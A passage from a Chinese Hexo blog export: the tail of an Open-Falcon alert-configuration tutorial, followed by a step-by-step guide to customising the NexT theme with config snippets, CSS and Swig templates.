<p>falcon的报警接收人不是一个具体的手机号，也不是一个具体的邮箱，因为手机号、邮箱都是容易发生变化的，如果变化了去修改所有相关配置那就太麻烦了。我们把用户的联系信息维护在一个叫UIC(新用户推荐使用Go版本的UIC，即：falcon-fe项目)的系统里，以后如果要修改手机号、邮箱，只要在UIC中修改一次即可。报警接收人也不是单个的人，而是一个组（UIC中称为Team），比如falcon这个系统的任何组件出问题了，都应该发报警给falcon的运维和开发人员，发给falcon这个团队，这样一来，新员工入职只要加入falcon这个Team即可；员工离职，只要从falcon这个Team删掉即可。</p>
<p>浏览器访问UIC，如果启用了LDAP，那就用LDAP账号登陆，如果没有启用，那就注册一个或者找管理员帮忙开通。创建一个Team，名称姑且叫falcon，把自己加进去，待会用来做测试。</p>
<h5 id="创建HostGroup"><a href="#创建HostGroup" class="headerlink" title="创建HostGroup"></a>创建HostGroup</h5><p>比如我们要对falcon-judge这个组件做端口监控，那首先创建一个HostGroup，把所有部署了falcon-judge这个模块的机器都塞进去，以后要扩容或下线机器的时候直接从这个HostGroup增删机器即可，报警策略会自动生效、失效。咱们为这个HostGroup取名为：sa.dev.falcon.judge，这个名称有讲究，sa是我们部门，dev是我们组，falcon是项目名，judge是组件名，传达出了很多信息，这样命名比较容易管理，推荐大家这么做。</p>
<p>在往组里加机器的时候如果报错，需要检查portal的数据库中host表，看里边是否有相关机器。那host表中的机器从哪里来呢？agent有个heartbeat(hbs)的配置，agent每分钟会发心跳给hbs，把自己的ip、hostname、agent version等信息告诉hbs，hbs负责写入host表。如果host表中没数据，需要检查这条链路是否通畅。</p>
<h5 id="创建策略模板"><a href="#创建策略模板" class="headerlink" title="创建策略模板"></a>创建策略模板</h5><p>portal最上面有个Templates链接，这就是策略模板管理的入口。我们进去之后创建一个模板，名称姑且也叫：sa.dev.falcon.judge，与HostGroup名称相同，在里边配置一个端口监控，通常进程监控有两种手段，一个是进程本身是否存活，一个是端口是否在监听，此处我们使用端口监控。</p>
<p><img src="/articles/4354c695/6.png" alt></p>
<p>右上角那个加号按钮是用于增加策略的，一个模板中可以有多个策略，此处我们只添加了一个。下面可以配置报警接收人，此处填写的是falcon，这是之前在UIC中创建的Team。</p>
<h5 id="将HostGroup与模板绑定"><a href="#将HostGroup与模板绑定" class="headerlink" title="将HostGroup与模板绑定"></a>将HostGroup与模板绑定</h5><p>一个模板是可以绑定到多个HostGroup的，现在我们重新回到HostGroups页面，找到sa.dev.falcon.judge这个HostGroup，右侧有几个超链接，点击【templates】进入一个新页面，输入模板名称，绑定一下就行了。</p>
<h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>上面步骤做完了，也就配置完了。如果judge组件宕机，端口不再监听了，就会报警。不过大家不要为了测试报警效果，直接把judge组件给干掉了，因为judge本身就是负责判断报警的，把它干掉了，那就没法判断了……所以说falcon现在并不完善，没法用来监控本身的组件。为了测试，大家可以修改一下端口监控的策略配置，改成一个没有在监听的端口，这样就触发报警了。</p>
<p>上面的策略只是对falcon-judge做了端口监控，那如果我们要对falcon这个项目的所有机器加一些负载监控，应该如何做呢？</p>
<ol>
<li>创建一个HostGroup：sa.dev.falcon，把所有falcon的机器都塞进去</li>
<li>创建一个模板：sa.dev.falcon.common，添加一些像cpu.idle,load.1min等策略</li>
<li>将sa.dev.falcon.common绑定到sa.dev.falcon这个HostGroup</li>
</ol>
<p>附：sa.dev.falcon.common的配置样例</p>
<p><img src="/articles/4354c695/7.png" alt></p>
<p>大家可能不知道各个指标分别叫什么，自己push的数据肯定知道自己的metric了，agent push的数据可以参考：<a href="https://github.com/open-falcon/agent/tree/master/funcs" target="_blank" rel="noopener">https://github.com/open-falcon/agent/tree/master/funcs</a></p>
<h5 id="如何配置策略表达式"><a href="#如何配置策略表达式" class="headerlink" title="如何配置策略表达式"></a>如何配置策略表达式</h5><p>策略表达式，即expression，具体可以参考<a href="http://book.open-falcon.org/zh/philosophy/tags-and-hostgroup.html" target="_blank" rel="noopener">HostGroup与Tags设计理念</a>，这里只是举个例子：</p>
<p><img src="/articles/4354c695/8.png" alt></p>
<p>上例中的配置传达出的意思是：falcon-judge这个模块的所有实例，如果qps连续3次大于1000，就报警给falcon这个报警组。</p>
<p>expression无需绑定到HostGroup。</p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Open-falcon</category>
      </categories>
      <tags>
        <tag>Open-falcon</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo最新next主题个性化炫酷教程</title>
    <url>/articles/1071f0bc.html</url>
    <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>看到有些next主题的网站很炫酷，那么是怎么配置的呢？接下来我会讲一讲如何配置next6.x或7.x最新版本实现一些炫酷的效果。先看下我博客网站的效果吧：wandouduoduo.github.io</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo官网</a></p>
<p><a href="https://hexo.io/themes/" target="_blank" rel="noopener">Theme选择</a></p>
<p><a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">NexT主题</a></p>
<a id="more"></a>

<h2 id="在右上角或者左上角实现fork-me-on-github"><a href="#在右上角或者左上角实现fork-me-on-github" class="headerlink" title="在右上角或者左上角实现fork me on github"></a>在右上角或者左上角实现fork me on github</h2><h3 id="效果图如下图所示："><a href="#效果图如下图所示：" class="headerlink" title="效果图如下图所示："></a>效果图如下图所示：</h3><p><img src="/articles/1071f0bc/2.png" alt="img"></p>
<h3 id="具体实现方法"><a href="#具体实现方法" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>在<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fblog%2F273-github-ribbons" target="_blank" rel="noopener">GitHub Ribbons</a>或<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ftholman.com%2Fgithub-corners%2F" target="_blank" rel="noopener">GitHub Corners</a>选择一款你喜欢的挂饰，拷贝方框内的代码</p>
<p><img src="/articles/1071f0bc/3.png" alt></p>
<p> 将刚刚复制的挂饰代码，添加到<code>Blog/themes/next/layout/_layout.swig</code>文件中，添加位置如下图所示(放在<code>&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;</code>下方)：</p>
<p><img src="/articles/1071f0bc/4.png" alt></p>
<h2 id="添加RSS"><a href="#添加RSS" class="headerlink" title="添加RSS"></a>添加RSS</h2><h3 id="实现效果图"><a href="#实现效果图" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/5.png" alt="img"></p>
<h3 id="具体实现方法-1"><a href="#具体实现方法-1" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>切换到<strong>Blog</strong>文件夹（hexo init的文件夹）下,并安装插件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd [Blog]</span><br><span class="line">npm install --save hexo-generator-feed</span><br></pre></td></tr></table></figure>

<p>安装成功之后，编辑<code>Blog/_config.yml</code>文件，在文件末尾添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: http://hexo.io/plugins/</span><br><span class="line">plugins: hexo-generate-feed</span><br></pre></td></tr></table></figure>

<p>配置主题<code>_config.yml</code>文件，<code>command+f</code>搜索<code>rss</code>，在后面加上<code>/atom.xml</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Set rss to false to disable feed link.</span><br><span class="line"># Leave rss as empty to use site&apos;s feed link.</span><br><span class="line"># Set rss to specific value if you have burned your feed already.</span><br><span class="line">rss: /atom.xml //注意：有一个空格</span><br></pre></td></tr></table></figure>

<h2 id="添加动态背景"><a href="#添加动态背景" class="headerlink" title="添加动态背景"></a>添加动态背景</h2><h3 id="实现效果图-1"><a href="#实现效果图-1" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/7.png" alt></p>
<h3 id="具体实现方法-2"><a href="#具体实现方法-2" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>主题配置文件中找到<strong>canvas_nest</strong>，设置成<strong>ture</strong>就OK啦。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Canvas-nest</span><br><span class="line">canvas_nest: ture</span><br></pre></td></tr></table></figure>

<h2 id="修改文章内链接文本样式"><a href="#修改文章内链接文本样式" class="headerlink" title="修改文章内链接文本样式"></a>修改文章内链接文本样式</h2><h3 id="实现效果图-2"><a href="#实现效果图-2" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/6.png" alt></p>
<h3 id="具体实现方法-3"><a href="#具体实现方法-3" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式，：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 文章内链接文本样式</span><br><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3; //原始链接颜色</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3; //底部分割线颜色</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #fc6423; //鼠标经过颜色</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423; //底部分割线颜色</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中选择<code>.post-body</code> 是为了不影响标题，选择 <code>p</code> 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。</p>
<hr>
<h2 id="修改底部标签样式"><a href="#修改底部标签样式" class="headerlink" title="修改底部标签样式"></a>修改底部标签样式</h2><h3 id="实现效果图-3"><a href="#实现效果图-3" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/8.png" alt></p>
<h3 id="具体实现方法-4"><a href="#具体实现方法-4" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>修改<code>Blog\themes\next\layout\_macro\post.swig</code>中文件，<code>command+f</code>搜索<code>rel=&quot;tag&quot;&gt;#</code>，将<code>#</code>替换成<code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code>。输入以下命令，查看效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<h2 id="在文章末尾添加“文章结束”标记"><a href="#在文章末尾添加“文章结束”标记" class="headerlink" title="在文章末尾添加“文章结束”标记"></a>在文章末尾添加“文章结束”标记</h2><h3 id="实现效果图-4"><a href="#实现效果图-4" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/9.png" alt></p>
<h3 id="具体实现方法-5"><a href="#具体实现方法-5" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>在路径<code>Blog\themes\next\layout\_macro</code>文件夹中新建<code>passage-end-tag.swig</code>文件,并填写内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>打开<code>Blog\themes\next\layout\_macro\post.swig</code>，在<code>post-body</code>之后，<code>post-footer</code>之前（<strong>post-footer之前两个DIV</strong>），添加以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &apos;passage-end-tag.swig&apos; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>添加位置，如下图所示：</p>
<p><img src="/articles/1071f0bc/10.png" alt></p>
<p>然后打开主题配置文件<code>_config.yml</code>,在末尾添加：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>

<h2 id="修改作者头像并旋转："><a href="#修改作者头像并旋转：" class="headerlink" title="修改作者头像并旋转："></a>修改作者头像并旋转：</h2><h3 id="实现效果图："><a href="#实现效果图：" class="headerlink" title="实现效果图："></a>实现效果图：</h3><p><img src="/articles/1071f0bc/1.png" alt="img"></p>
<h3 id="具体实现方法-6"><a href="#具体实现方法-6" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>在<code>Blog/_config.yml</code>中添加头像链接地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//添加头像地址</span><br><span class="line">avatar: [ http://....]</span><br></pre></td></tr></table></figure>

<p>打开<code>\themes\next\source\css\_common\components\sidebar\sidebar-author.styl</code>，在里面添加如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.site-author-image &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  padding: $site-author-image-padding;</span><br><span class="line">  max-width: $site-author-image-width;</span><br><span class="line">  height: $site-author-image-height;</span><br><span class="line">  border: $site-author-image-border-width solid $site-author-image-border-color;</span><br><span class="line"></span><br><span class="line">  /* 头像圆形 */</span><br><span class="line">  border-radius: 80px;</span><br><span class="line">  -webkit-border-radius: 80px;</span><br><span class="line">  -moz-border-radius: 80px;</span><br><span class="line">  box-shadow: inset 0 -1px 0 #333sf;</span><br><span class="line"></span><br><span class="line">  /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 </span><br><span class="line">    (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  /* 鼠标经过头像旋转360度 */</span><br><span class="line">  -webkit-transition: -webkit-transform 1.0s ease-out;</span><br><span class="line">  -moz-transition: -moz-transform 1.0s ease-out;</span><br><span class="line">  transition: transform 1.0s ease-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">img:hover &#123;</span><br><span class="line">  /* 鼠标经过停止头像旋转 </span><br><span class="line">  -webkit-animation-play-state:paused;</span><br><span class="line">  animation-play-state:paused;*/</span><br><span class="line"></span><br><span class="line">  /* 鼠标经过头像旋转360度 */</span><br><span class="line">  -webkit-transform: rotateZ(360deg);</span><br><span class="line">  -moz-transform: rotateZ(360deg);</span><br><span class="line">  transform: rotateZ(360deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Z 轴旋转动画 */</span><br><span class="line">@-webkit-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@-moz-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -moz-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -moz-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="修改-代码块自定义样式"><a href="#修改-代码块自定义样式" class="headerlink" title="修改``代码块自定义样式"></a>修改``代码块自定义样式</h2><h3 id="具体实现方法-7"><a href="#具体实现方法-7" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>打开<code>Blog\themes\next\source\css\_custom\custom.styl</code>，添加以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// Custom styles.</span><br><span class="line">code &#123;</span><br><span class="line">    color: #ff7600;</span><br><span class="line">    background: #fbf7f8;</span><br><span class="line">    margin: 2px;</span><br><span class="line">&#125;</span><br><span class="line">// 大代码块的自定义样式</span><br><span class="line">.highlight, pre &#123;</span><br><span class="line">    margin: 5px 0;</span><br><span class="line">    padding: 5px;</span><br><span class="line">    border-radius: 3px;</span><br><span class="line">&#125;</span><br><span class="line">.highlight, code, pre &#123;</span><br><span class="line">    border: 1px solid #d6d6d6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="侧边栏社交小图标设置"><a href="#侧边栏社交小图标设置" class="headerlink" title="侧边栏社交小图标设置"></a>侧边栏社交小图标设置</h2><h3 id="实现效果图-5"><a href="#实现效果图-5" class="headerlink" title="实现效果图"></a>实现效果图</h3><p>图标可以去<a href="https://fontawesome.com/icons?from=io" target="_blank" rel="noopener">Font Awesome Icon</a>网站去找，找到后复制名字到相应的位置即可。</p>
<p><img src="/articles/1071f0bc/11.png" alt></p>
<h3 id="具体实现方法-8"><a href="#具体实现方法-8" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>打开主题配置文件<code>_config.yml</code>，<code>command+f</code>搜索<code>Social</code>，将你有的社交账号前面的<code>#</code>号去掉。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#social:</span><br><span class="line">  GitHub: https://github.com/wandouduoduo || github</span><br><span class="line">  E-mail: mailto:wandouduoduo@163.com || envelope</span><br><span class="line">  Gitee: https://gitee.com/ || heartbeat</span><br><span class="line">  微博: https://weibo.com/u/1989032071/home?wvr=5 || weibo</span><br><span class="line">  #E-Mail: mailto:yourname@gmail.com || envelope</span><br><span class="line">  #Google: https://plus.google.com/yourname || google</span><br><span class="line">  #Twitter: https://twitter.com/yourname || twitter</span><br><span class="line">  #FB Page: https://www.facebook.com/yourname || facebook</span><br><span class="line">  #VK Group: https://vk.com/yourname || vk</span><br><span class="line">  #StackOverflow: https://stackoverflow.com/yourname || stack-overflow</span><br><span class="line">  #YouTube: https://youtube.com/yourname || youtube</span><br><span class="line">  #Instagram: https://instagram.com/yourname || instagram</span><br><span class="line">  #Skype: skype:yourname?call|chat || skype</span><br></pre></td></tr></table></figure>

<h2 id="主页文章添加阴影效果"><a href="#主页文章添加阴影效果" class="headerlink" title="主页文章添加阴影效果"></a>主页文章添加阴影效果</h2><h3 id="实现效果图-6"><a href="#实现效果图-6" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/12.png" alt="img"></p>
<h3 id="具体实现方法-9"><a href="#具体实现方法-9" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>打开<code>\themes\next\source\css\_custom\custom.styl</code>,向里面加入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 主页文章添加阴影效果</span><br><span class="line"> .post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   padding: 25px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="在网站底部加上访问量"><a href="#在网站底部加上访问量" class="headerlink" title="在网站底部加上访问量"></a>在网站底部加上访问量</h2><h3 id="实现效果图-7"><a href="#实现效果图-7" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/13.png" alt="img"></p>
<h3 id="具体实现方法-10"><a href="#具体实现方法-10" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>6.x后集成了busuanzi模块统计，只需要打开<code>\themes\next\_config</code>文件编辑如下即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">enable: true</span><br><span class="line">total_visitors: true</span><br><span class="line">total_visitors_icon: user</span><br><span class="line">total_views: true</span><br><span class="line">total_views_icon: eye</span><br><span class="line">post_views: true</span><br><span class="line">post_views_icon: eye</span><br></pre></td></tr></table></figure>

<h2 id="网站底部字数统计"><a href="#网站底部字数统计" class="headerlink" title="网站底部字数统计"></a>网站底部字数统计</h2><h3 id="具体方法实现"><a href="#具体方法实现" class="headerlink" title="具体方法实现"></a>具体方法实现</h3><p>切换到根目录下，然后运行如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure>

<p>然后在<code>/themes/next/layout/_partials/footer.swig</code>文件尾部添加加上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;theme-info&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h2 id="设置网站的图标Favicon"><a href="#设置网站的图标Favicon" class="headerlink" title="设置网站的图标Favicon"></a>设置网站的图标Favicon</h2><h3 id="实现效果图-8"><a href="#实现效果图-8" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/14.png" alt="img"></p>
<h3 id="具体方法实现-1"><a href="#具体方法实现-1" class="headerlink" title="具体方法实现"></a>具体方法实现</h3><p>在图标网站找一张你喜欢的图标（大：32x32 小：16x16），图标网站：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.easyicon.net%2F" target="_blank" rel="noopener">easyicon</a>或者<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.iconfont.cn%2F" target="_blank" rel="noopener">阿里巴巴矢量图标库</a>。将下载下来的小图和中图放在<code>Blog/themes/next/source/images</code>，将默认的两张图片替换掉。修改主题配置文件，如果你自定义了图片名字，需要做修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16-next.png  //16X16小图</span><br><span class="line">  medium: /images/favicon-32x32-next.png  //32X32大图</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br></pre></td></tr></table></figure>

<h2 id="实现文章统计功能"><a href="#实现文章统计功能" class="headerlink" title="实现文章统计功能"></a>实现文章统计功能</h2><h3 id="具体实现方法-11"><a href="#具体实现方法-11" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>在根目录下安装 <code>hexo-wordcount</code>,运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure>

<p>然后在主题的配置文件中，配置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_post: true</span><br><span class="line">  item_text_total: true</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br></pre></td></tr></table></figure>

<h2 id="添加顶部加载条"><a href="#添加顶部加载条" class="headerlink" title="添加顶部加载条"></a>添加顶部加载条</h2><h3 id="具体实现方法-12"><a href="#具体实现方法-12" class="headerlink" title="具体实现方法"></a>具体实现方法</h3><p>编辑主题配置文件，<code>command+F</code>搜索<code>pace</code>，将其值改为<code>ture</code>就可以了，选择一款你喜欢的样式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Progress bar in the top during page loading.</span><br><span class="line">pace: ture</span><br><span class="line"># Themes list:</span><br><span class="line">#pace-theme-big-counter</span><br><span class="line">#pace-theme-bounce</span><br><span class="line">#pace-theme-barber-shop</span><br><span class="line">#pace-theme-center-atom</span><br><span class="line">#pace-theme-center-circle</span><br><span class="line">#pace-theme-center-radar</span><br><span class="line">#pace-theme-center-simple</span><br><span class="line">#pace-theme-corner-indicator</span><br><span class="line">#pace-theme-fill-left</span><br><span class="line">#pace-theme-flash</span><br><span class="line">#pace-theme-loading-bar</span><br><span class="line">#pace-theme-mac-osx</span><br><span class="line">#pace-theme-minimal</span><br><span class="line"># For example</span><br><span class="line"># pace_theme: pace-theme-center-simple</span><br><span class="line">pace_theme: pace-theme-minimal</span><br></pre></td></tr></table></figure>

<h2 id="在文章底部增加版权信息"><a href="#在文章底部增加版权信息" class="headerlink" title="在文章底部增加版权信息"></a>在文章底部增加版权信息</h2><h3 id="实现效果图-9"><a href="#实现效果图-9" class="headerlink" title="实现效果图"></a>实现效果图</h3><p><img src="/articles/1071f0bc/15.png" alt="img"></p>
<p>在目录<code>Blog/themes/next/layout/_macro/</code>，添加文件 <code>my-copyright.swig</code>，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if page.copyright %&#125;</span><br><span class="line">&lt;div class=&quot;my_post_copyright&quot;&gt;</span><br><span class="line">  &lt;script src=&quot;//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- JS库 sweetalert 可修改路径 --&gt;</span><br><span class="line">  &lt;script src=&quot;https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;https://unpkg.com/sweetalert/dist/sweetalert.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&lt;a href=&quot;&#123;&#123; url_for(page.path) &#125;&#125;&quot;&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&lt;a href=&quot;/&quot; title=&quot;访问 &#123;&#123; theme.author &#125;&#125; 的个人博客&quot;&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format(&quot;YYYY年MM月DD日 - HH:MM&quot;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format(&quot;YYYY年MM月DD日 - HH:MM&quot;) &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href=&quot;&#123;&#123; url_for(page.path) &#125;&#125;&quot; title=&quot;&#123;&#123; page.title &#125;&#125;&quot;&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt;</span><br><span class="line">    &lt;span class=&quot;copy-path&quot;  title=&quot;点击复制文章链接&quot;&gt;&lt;i class=&quot;fa fa-clipboard&quot; data-clipboard-text=&quot;&#123;&#123; page.permalink &#125;&#125;&quot;  aria-label=&quot;复制成功！&quot;&gt;&lt;/i&gt;&lt;/span&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class=&quot;fa fa-creative-commons&quot;&gt;&lt;/i&gt; &lt;a rel=&quot;license&quot; href=&quot;https://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot; title=&quot;Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)&quot;&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt;  </span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt; </span><br><span class="line">    var clipboard = new Clipboard(&apos;.fa-clipboard&apos;);</span><br><span class="line">    $(&quot;.fa-clipboard&quot;).click(function()&#123;</span><br><span class="line">      clipboard.on(&apos;success&apos;, function()&#123;</span><br><span class="line">        swal(&#123;   </span><br><span class="line">          title: &quot;&quot;,   </span><br><span class="line">          text: &apos;复制成功&apos;,</span><br><span class="line">          icon: &quot;success&quot;, </span><br><span class="line">          showConfirmButton: true</span><br><span class="line">          &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;);  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>在目录<code>Blog/themes/next/source/css/_common/components/post/</code>下添加文件<code>my-post-copyright.styl</code>，添加以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.my_post_copyright &#123;</span><br><span class="line">  width: 85%;</span><br><span class="line">  max-width: 45em;</span><br><span class="line">  margin: 2.8em auto 0;</span><br><span class="line">  padding: 0.5em 1.0em;</span><br><span class="line">  border: 1px solid #d3d3d3;</span><br><span class="line">  font-size: 0.93rem;</span><br><span class="line">  line-height: 1.6em;</span><br><span class="line">  word-break: break-all;</span><br><span class="line">  background: rgba(255,255,255,0.4);</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright p&#123;margin:0;&#125;</span><br><span class="line">.my_post_copyright span &#123;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  width: 5.2em;</span><br><span class="line">  color: #b5b5b5;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright .raw &#123;</span><br><span class="line">  margin-left: 1em;</span><br><span class="line">  width: 5em;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright a &#123;</span><br><span class="line">  color: #808080;</span><br><span class="line">  border-bottom:0;</span><br><span class="line">&#125;</span><br><span class="line">.my_post_copyright a:hover &#123;</span><br><span class="line">  color: #a3d2a3;</span><br><span class="line">  text-decoration: 